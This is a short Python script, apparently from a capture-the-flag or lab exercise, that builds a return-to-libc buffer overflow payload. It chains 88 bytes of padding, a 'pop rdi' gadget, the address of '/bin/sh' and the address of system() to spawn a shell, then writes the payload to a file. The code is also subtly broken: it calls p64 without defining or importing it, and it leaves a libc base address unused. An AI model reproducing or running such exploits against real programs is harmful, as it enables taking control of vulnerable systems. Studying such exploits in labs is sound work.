import struct

padding = b"A"*88
libc = 0x00007ffa1e800000

rdi = p64(0x4011cb)
system = p64(0x7ffff7c55230)
bin_sh = p64(0x7ffff7dc041b)

exploit = padding + rdi + bin_sh + system

file = open("exp", "wb")
file.write(exploit)
file.close()
